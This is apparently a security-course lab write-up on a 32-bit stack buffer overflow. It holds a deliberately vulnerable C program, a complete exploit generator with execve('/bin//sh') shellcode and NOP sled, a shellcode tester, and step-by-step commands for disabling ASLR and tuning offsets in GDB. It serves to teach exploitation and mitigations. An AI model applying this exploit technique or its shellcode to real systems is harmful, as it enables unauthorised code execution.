# Advanced Stack Overflow Challenge: The Demeter

## Overview

This is an advanced buffer overflow challenge that brings together everything you've learned. You'll need to:
- Analyze vulnerable code
- Calculate precise offsets
- Craft a working exploit
- Inject and execute shellcode
- Bypass basic protections

This challenge is modeled after real-world exploitation scenarios and requires understanding of:
- Stack layout and memory addresses
- Little-endian byte ordering
- NOP sleds and shellcode
- Exploit development techniques

## The Challenge Files

This directory contains four key files:

1. **stack.c** - The vulnerable program
2. **exploit.c** - An exploit generator
3. **call_shellcode.c** - Shellcode testing program
4. **prep.md** - Setup and preparation guide

## File 1: The Vulnerable Program (stack.c)

### Source Code Analysis

```c
/* stack.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[12];

    /* Can you spot the buffer overflow here? ;-) */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    /* This tries to handle 517 bytes and the strcpy is trying to copy that to buffer which only has 12 bytes */ 
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
```

### Vulnerability Analysis

**The Critical Flaw:**
```c
char buffer[12];  // Only 12 bytes allocated
strcpy(buffer, str);  // Copies up to 517 bytes!
```

**Stack Layout:**
```
High Memory
┌─────────────────────────┐
│  Return Address         │ ← Target for overwrite
├─────────────────────────┤
│  Saved EBP              │
├─────────────────────────┤
│  buffer[12]             │ ← Only 12 bytes!
└─────────────────────────┘
Low Memory
```

**Attack Vector:**
- Program reads 517 bytes from `badfile`
- Copies all 517 bytes into 12-byte buffer
- **Overflow**: 505 bytes overwrite stack memory
- Return address can be controlled

### Compilation

```bash
# Compile with protections disabled
gcc stack.c -o stack -fno-stack-protector -z execstack -m32 -g

# Verify it's 32-bit and stack is executable
file stack
readelf -l stack | grep GNU_STACK
```

## File 2: The Exploit Generator (exploit.c)

### Source Code Analysis

```c
//exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define DEFAULT_OFFSET 350 

char code[]=
"\x31\xc0"             // xorl    %eax,%eax
"\x50"                 // pushl   %eax
"\x68""//sh"           // pushl   $0x68732f2f
"\x68""/bin"           // pushl   $0x6e69622f
"\x89\xe3"             // movl    %esp,%ebx
"\x50"                 // pushl   %eax
"\x53"                 // pushl   %ebx
"\x89\xe1"             // movl    %esp,%ecx
"\x99"                 // cdq
"\xb0\x0b"             // movb    $0x0b,%al
"\xcd\x80"             // int     $0x80
;

unsigned long get_sp(void)
{
     __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    char *ptr;
    long *a_ptr,ret;

    int offset = DEFAULT_OFFSET;
    int codeSize = sizeof(code);
    int buffSize = sizeof(buffer);

    if(argc > 1) offset = atoi(argv[1]); //this allows for command line input

    ptr=buffer;
    a_ptr = (long *) ptr;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, buffSize);

    //----------------------BEGIN FILL BUFFER----------------------\\

    ret = get_sp()+offset;
    printf("Return Address: 0x%x\n",get_sp());
    printf("Address: 0x%x\n",ret);

    ptr = buffer;
    a_ptr = (long *) ptr;

    int i;
    for (i = 0; i < 300;i+=4)
        *(a_ptr++) = ret;

    for(i = 486;i < codeSize + 486;++i)
        buffer[i] = code[i-486];

    buffer[buffSize - 1] = '\0';
    //-----------------------END FILL BUFFER-----------------------\\

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);    
}
```

### How the Exploit Works

**Buffer Layout (517 bytes total):**
```
[Bytes 0-299: Return addresses] [Bytes 300-485: NOPs] [Bytes 486-510: Shellcode] [Byte 516: NULL]
```

**Detailed Breakdown:**

1. **Bytes 0-299 (300 bytes)**: Filled with return addresses
   - Every 4 bytes contains the guessed return address
   - Increases chances of hitting the right return address position
   - Acts as a "spray" of potential landing points

2. **Bytes 300-485 (186 bytes)**: NOP sled (`\x90`)
   - No Operation instructions
   - CPU "slides" through them to shellcode
   - Provides flexibility in jump target

3. **Bytes 486-510 (25 bytes)**: Shellcode
   - Executes `/bin/sh` (spawns shell)
   - Placed near end of buffer
   - Will be in stack after overflow

4. **Byte 516**: Null terminator

**Key Technique: Offset Adjustment**
```c
ret = get_sp()+offset;
```
- `get_sp()` gets current stack pointer
- `offset` (default 350) is added to estimate buffer location in `stack` program
- This address is written multiple times to hit return address

### Compilation and Execution

```bash
# Compile the exploit generator
gcc exploit.c -o exploit -m32

# Run to generate badfile
./exploit

# Or with custom offset
./exploit 400

# Check badfile contents
xxd badfile | head -20
```

## File 3: Shellcode Testing (call_shellcode.c)

### Source Code

```c
/* call_shellcode.c */

/* This program will create a file containing code for launching a shell */

#include <stdlib.h>
#include <stdio.h>

const char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
}
```

### Understanding the Shellcode

**Assembly Breakdown:**
```assembly
xorl    %eax,%eax           ; Zero out EAX register
pushl   %eax                ; Push NULL onto stack (arg terminator)
pushl   $0x68732f2f         ; Push "//sh" onto stack
pushl   $0x6e69622f         ; Push "/bin" onto stack
movl    %esp,%ebx           ; EBX = pointer to "/bin//sh"
pushl   %eax                ; Push NULL (argv[1])
pushl   %ebx                ; Push pointer to "/bin//sh" (argv[0])
movl    %esp,%ecx           ; ECX = pointer to argv array
cdq                         ; Zero out EDX (envp = NULL)
movb    $0x0b,%al           ; EAX = 11 (execve syscall number)
int     $0x80               ; Execute syscall: execve("/bin//sh", ["/bin//sh", NULL], NULL)
```

**Result**: Spawns `/bin/sh` shell

### Testing the Shellcode

```bash
# Compile
gcc call_shellcode.c -o call_shellcode -fno-stack-protector -z execstack -m32

# Run - should spawn a shell
./call_shellcode

# If successful, you'll get a new shell prompt
$ whoami
$ exit
```

## Complete Exploitation Walkthrough

### Step 1: Environment Setup

```bash
# Disable ASLR (for learning purposes)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Create working directory
mkdir demeter_challenge
cd demeter_challenge

# Copy or create the files
# (stack.c, exploit.c, call_shellcode.c)
```

### Step 2: Compile All Programs

```bash
# Compile vulnerable program
gcc stack.c -o stack -fno-stack-protector -z execstack -m32 -g

# Compile exploit generator
gcc exploit.c -o exploit -m32

# Compile shellcode tester
gcc call_shellcode.c -o call_shellcode -fno-stack-protector -z execstack -m32
```

### Step 3: Test Shellcode

```bash
# Verify shellcode works
./call_shellcode
# Should give you a shell
```

### Step 4: Generate Initial Exploit

```bash
# Generate badfile with default offset
./exploit
```

### Step 5: Test Vulnerability

```bash
# Run vulnerable program
./stack

# Did you get a shell?
# If yes: SUCCESS! You've exploited it!
# If no: Continue to Step 6
```

### Step 6: Offset Tuning (if needed)

The default offset of 350 may not work on all systems. You need to adjust it.

**Method 1: Trial and Error**
```bash
# Try different offsets
./exploit 300
./stack

./exploit 400
./stack

./exploit 450
./stack

# Keep adjusting until it works
```

**Method 2: Using GDB**
```bash
# Generate exploit with default offset
./exploit

# Debug the vulnerable program
gdb ./stack

# Run in GDB
(gdb) run

# If it crashes, check EIP
(gdb) info registers eip

# Check stack
(gdb) x/100wx $esp

# Calculate offset based on where you need to land
# Look for your NOP sled (0x90909090)
```

**Method 3: Calculate Precisely**
```bash
# Find buffer address in stack program
gdb ./stack
(gdb) break bof
(gdb) run
(gdb) info frame
(gdb) print &buffer

# Find return address location
(gdb) info frame
# Note saved eip location

# Calculate offset: (buffer_in_stack - buffer_in_exploit) + adjustment
```

### Step 7: Successful Exploitation

When you get it right:
```bash
$ ./stack
# You should get a new shell prompt
# (The "Returned Properly" message won't appear)
$
$ whoami
[your username]
$ exit
```

## Advanced Challenges

### Challenge 1: Modify the Shellcode
Change the shellcode to:
- Execute a different command
- Bind a shell to a port
- Connect back to attacker's machine

### Challenge 2: Enable DEP/NX
```bash
# Compile with NX enabled
gcc stack.c -o stack_nx -fno-stack-protector -m32

# Exploit using return-to-libc technique
# (Much harder!)
```

### Challenge 3: Enable Stack Canaries
```bash
# Compile with stack protector
gcc stack.c -o stack_canary -z execstack -m32

# Find a way to leak or bypass the canary
```

### Challenge 4: Enable ASLR
```bash
# Re-enable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Exploit using information leak + ROP
```

### Challenge 5: 64-bit Exploitation
```bash
# Compile as 64-bit
gcc stack.c -o stack64 -fno-stack-protector -z execstack

# Modify exploit for x64 architecture
# (Different registers, calling conventions, addresses)
```

## Troubleshooting Guide

### "Illegal instruction" or random crash
- **Cause**: Offset is wrong, jumping to non-executable data
- **Fix**: Adjust offset value, try values ±50 from current

### "Segmentation fault" immediately
- **Cause**: Jumping to invalid address
- **Fix**: Check if ASLR is disabled, verify addresses in GDB

### Nothing happens, program exits normally
- **Cause**: Return address not overwritten properly
- **Fix**: Verify buffer overflow is happening, check file permissions on badfile

### "badfile: No such file or directory"
- **Cause**: Exploit not run yet
- **Fix**: Run `./exploit` first to generate badfile

### Shellcode doesn't execute
- **Cause**: Stack not executable (NX/DEP enabled)
- **Fix**: Recompile with `-z execstack` flag

## Learning Objectives Achieved

After completing this challenge, you should understand:
- ✅ How to analyze vulnerable C code
- ✅ Stack layout and memory organization
- ✅ Offset calculation techniques
- ✅ NOP sleds and their purpose
- ✅ Shellcode structure and execution
- ✅ Little-endian address representation
- ✅ Exploit development workflow
- ✅ Debugging with GDB for exploitation
- ✅ Modern security protections (ASLR, DEP, stack canaries)

## Real-World Implications

### Similar Vulnerabilities

**Historic Examples:**
- **Buffer Overflows in network daemons** (1990s-2000s)
- **OpenSSL Heartbleed** (different type, same concept)
- **sudo vulnerabilities** (heap overflow, but similar exploitation)

**Modern Context:**
- These vulnerabilities still exist in legacy systems
- Embedded systems and IoT devices often lack protections
- Understanding these basics is crucial for reverse engineering and security research

### Professional Applications

**Penetration Testing:**
- Identify and exploit buffer overflows in client applications
- Demonstrate risk to stakeholders
- Recommend security improvements

**Security Research:**
- Analyze vulnerabilities in software
- Develop proof-of-concept exploits
- Contribute to responsible disclosure

**Defensive Security:**
- Understand attacker techniques
- Design better protections
- Review code for similar patterns

## Next Steps

- Study [Writing Exploits](../../exploitation/writing-exploits.md) for advanced techniques
- Learn about [Modern Mitigations](../../defenses/mitigations.md) in depth
- Practice on platforms like [Exploit Education](https://exploit.education)
- Try real-world challenges on [CTF platforms](../../resources/external-platforms.md)
- Explore [ARM Exploitation](../../resources/arm-resources.md) for different architectures

## References

- [Smashing the Stack for Fun and Profit](http://phrack.org/issues/49/14.html) - Aleph One's classic paper
- [Shellcoding for Linux and Windows Tutorial](http://www.vividmachines.com/shellcode/shellcode.html)
- [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
- [Linux Syscall Reference](https://syscalls.kernelgrok.com/)

---

**⚠️ Important**: This challenge is for educational purposes only. Use these techniques only in authorized testing environments. Exploiting systems without permission is illegal and unethical.

**🎓 Congratulations** on taking on this advanced challenge! Buffer overflow exploitation is a fundamental skill in security research and reverse engineering. Keep practicing and exploring!

